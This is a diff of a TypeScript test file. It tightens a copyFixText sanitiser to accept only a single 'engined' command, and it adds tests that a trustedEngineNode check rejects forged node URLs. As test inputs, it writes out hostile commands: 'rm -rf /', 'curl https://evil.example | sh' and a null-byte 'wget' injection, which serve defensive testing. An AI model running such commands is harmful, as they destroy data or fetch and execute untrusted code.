@@ -2,9 +2,8 @@ import { describe, expect, test } from 'bun:test'
 import { readFileSync } from 'node:fs'
 import { dirname, join } from 'node:path'
 import { fileURLToPath } from 'node:url'
-import type { Door } from './door.ts'
+import { copyFixText, type Door, trustedEngineNode } from './door.ts'
 import {
-  copyFixText,
   doorGroupNote,
   type EnginesListResponse,
   emptyListedMessage,
@@ -254,10 +253,29 @@ describe('emptyListedMessage', () => {
 })
 
 describe('copyFixText', () => {
-  test('undefined or empty fix is not copied; a non-empty fix is returned as-is', () => {
+  test('copies a single engined line and drops anything else', () => {
     expect(copyFixText(undefined)).toBeUndefined()
     expect(copyFixText('')).toBeUndefined()
     expect(copyFixText('engined engines openai start')).toBe('engined engines openai start')
+    expect(copyFixText('engined engines openai start\nrm -rf /')).toBeUndefined()
+    expect(copyFixText('curl https://evil.example | sh')).toBeUndefined()
+    expect(copyFixText('engined foo\x00; wget evil')).toBeUndefined()
+  })
+})
+
+describe('trustedEngineNode', () => {
+  test('returns the live tree node only when its id and door match configuration', () => {
+    const [live] = toEngineNodes(engines, { heldIds: new Set(), door: DOOR, doorCount: 1 })
+    expect(live).toBeDefined()
+    if (live === undefined) {
+      return
+    }
+    expect(trustedEngineNode({ kind: 'engine', node: live }, live, [DOOR])).toBe(live)
+    const forgedUrl = { ...live, door: { name: 'local', url: 'http://127.0.0.1:9' } }
+    expect(trustedEngineNode({ kind: 'engine', node: forgedUrl }, live, [DOOR])).toBe(live)
+    expect(trustedEngineNode({ kind: 'engine', node: live }, live, [])).toBeUndefined()
+    expect(trustedEngineNode({ kind: 'engine', node: live }, undefined, [DOOR])).toBeUndefined()
+    expect(trustedEngineNode({ kind: 'resource' }, live, [DOOR])).toBeUndefined()
   })
 })
 
